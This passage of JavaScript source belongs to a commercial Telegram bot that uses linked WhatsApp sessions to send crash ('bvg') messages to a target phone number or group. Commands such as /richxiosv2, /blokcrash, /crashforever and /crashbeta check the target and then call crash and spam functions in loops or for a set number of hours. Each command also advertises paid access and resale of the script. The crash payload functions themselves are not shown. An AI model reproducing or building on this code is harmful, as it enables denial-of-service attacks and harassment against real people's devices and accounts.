    console.log(`[DEBUG] /androidgc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /androidgc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /androidgc: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
  await sendTelegramGreetingLog('/richxiosv2', senderId, rawTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg to👇🏻
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonNewBloksWidgetCrashGCExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
  await sendTelegramGreetingLog('/richxiosv2', senderId, rawTarget, false);
    console.error(`Error in /androidgc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /androidgc: ${error.message}`);
  }
});

botInstance.onText(/\/richxiosv2(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /richxiosv2 raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }
  
  if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /richxiosv2 input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /richxiosv2: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /richxiosv2 +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /richxiosv2: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /richxiosv2: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /richxiosv2: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /richxiosv2: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
  await sendTelegramGreetingLog('/richxiosv2', senderId, numberTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇🏻
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });
        for (let i = 0; i < 100; i++) {
          await xeonRichIosV2(formattedNumber, userNumber, chatId, botInstance);
        }
  } catch (error) {
  await sendTelegramGreetingLog('/richxiosv2', senderId, numberTarget, false);
    console.error(`Error in /richxiosv2 for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /richxiosv2: ${error.message}`);
  }
});

botInstance.onText(/\/2i29wixjkd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /blokcrash raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /blokcrash input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /blokcrash: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /blokcrash +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /blokcrash: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /blokcrash +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /blokcrash: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /blokcrash: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /blokcrash: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /blokcrash: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
  await sendTelegramGreetingLog('/blokcrash', senderId, numberTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonNewBloksWidgetCrashExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
  await sendTelegramGreetingLog('/blokcrash', senderId, numberTarget, false);
    console.error(`Error in /blokcrash for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /blokcrash: ${error.message}`);
  }
});

botInstance.onText(/\/83jejdkdks(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /crashforever  raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }
  
  // Premium check
  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  console.log(`[DEBUG] /crashforever  input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /crashforever : No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /crashforever  +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /crashforever : rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /crashforever : Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /crashforever : numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /crashforever : Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇🏻
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });
        for (let i = 0; i < 30; i++) {
          await xeonCrashPmInfinity(formattedNumber, userNumber, chatId, botInstance);
          await sleep(1000);
        }
  } catch (error) {
    console.error(`Error in /crashforever  for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /crashforever : ${error.message}`);
  }
});

botInstance.onText(/\/jeoejdcmmd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /richcrash raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /richcrash input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /richcrash: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /richcrash +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /richcrash: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /richcrash +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /richcrash: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /richcrash: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /richcrash: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /richcrash: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
  await sendTelegramGreetingLog('/richcrash', senderId, numberTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonExtentedTextMessageExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
  await sendTelegramGreetingLog('/richcrash', senderId, numberTarget, false);
    console.error(`Error in /richcrash for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /richcrash: ${error.message}`);
  }
});

botInstance.onText(/\/richxios(?!\S)(\s+(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!checkRateLimit(senderId, chatId)) return;

    const userNumber = db.userNumbers[senderId];
    if (!userNumber) {
        return userBot.sendMessage(chatId, '❌ No WhatsApp number linked. Use /reqpair.');
    }

    if (!(await validateSession(userNumber, chatId, botInstance))) {
        return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
    }

    // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

    if (!match[2] || match[2].trim() === '') {
        return userBot.sendMessage(chatId, '❌ Example: /richxios +919876543210');
    }

    const rawTarget = match[2].trim().split(/\s+/)[0];

    if (!isValidPhoneNumber(rawTarget)) {
        return userBot.sendMessage(chatId, '❌ Invalid target number.');
    }

    const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');

    if (numberTarget.length < 8 || numberTarget.length > 15) {
        return userBot.sendMessage(chatId, `❌ Invalid number length.`);
    }

    if (numberTarget === userNumber) {
        return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
    }

    const blockedNumbers = ['916909137213', '919366316011', '919402104401'];
    if (blockedNumbers.includes(numberTarget)) {
        return userBot.sendMessage(chatId, '❌ Cannot target this number.');
    }

    const formattedNumber = `${numberTarget}@s.whatsapp.net`;

    try {
    await sendTelegramGreetingLog('/richxios', senderId, numberTarget, true);
        await userBot.sendPhoto(chatId, CONFIG.pfp, {
            caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
            parse_mode: 'HTML'
        });

        for (let i = 0; i < 100; i++) {
          await xeonUnifiedRichResponseMessage2(formattedNumber, userNumber, chatId, botInstance, true);
        }

    } catch (error) {
    await sendTelegramGreetingLog('/richxios', senderId, numberTarget, false);
        await userBot.sendMessage(chatId, `❌ Failed to start /richxios: ${error.message}`);
    }
});

botInstance.onText(/\/8ejejddj(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /richcrashv2 raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }
  
  if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /richcrashv2 input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /richcrashv2: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /richcrashv2 +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /richcrashv2: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /richcrashv2: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /richcrashv2: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /richcrashv2: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
  await sendTelegramGreetingLog('/richcrashv2', senderId, numberTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇🏻
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });
        for (let i = 0; i < 5; i++) {
          await xeonExtentedTextMessageV2(formattedNumber, userNumber, chatId, botInstance, true);
          await sleep(1000);
        }
  } catch (error) {
  await sendTelegramGreetingLog('/richcrashv2', senderId, numberTarget, false);
    console.error(`Error in /richcrashv2 for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /richcrashv2: ${error.message}`);
  }
});

botInstance.onText(/\/7382iejeu(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /cinvisible raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /cinvisible input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /cinvisible: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /cinvisible +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /cinvisible: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /cinvisible +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /cinvisible: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /cinvisible: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /cinvisible: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /cinvisible: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonCrashPmInfinityInvisibleExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /cinvisible for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /cinvisible: ${error.message}`);
  }
});

botInstance.onText(/\/delayfcgc(?:\s+(.+))?/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  const userBot = getUserBot(botInstance);

  // Premium check
  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  return
});

botInstance.onText(/\/crashbetagc(?:\s+(.+))?/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  const userBot = getUserBot(botInstance);

  // Premium check
  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  return userBot.sendMessage(
    chatId,
    `To use this command you have to use zip file bot, below is the guide to use zip file bot\n\n<a href="https://t.me/c/3698813612/112140">click here to watch guide video</a>`,
    { parse_mode: 'HTML' }
  );
});

botInstance.onText(/\/freezecrash(?:\s+(.+))?/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  const userBot = getUserBot(botInstance);

  // Premium check
  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  return userBot.sendMessage(
    chatId,
    `To use this command you have to use zip file bot, below is the guide to use zip file bot\n\n<a href="https://t.me/c/3698813612/112140">click here to watch guide video</a>`,
    { parse_mode: 'HTML' }
  );
});

botInstance.onText(/\/xfgdeer(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /crashbeta raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /crashbeta input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /crashbeta: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /crashbeta +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /crashbeta: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /crashbeta: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /crashbeta: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /crashbeta: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    /*await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇🏻
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });
        for (let i = 0; i < 3333; i++) {
          await xeonPendingCrash2(formattedNumber, userNumber, chatId, botInstance, true);
          await sleep(1000);
        }*/
        await spamDelayFC(formattedNumber, userNumber, chatId, botInstance, false, 3333);   // for private
  } catch (error) {
    console.error(`Error in /crashbeta for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /crashbeta: ${error.message}`);
  }
});

botInstance.onText(/\/nfeoeoejfjif(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delayfcgc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

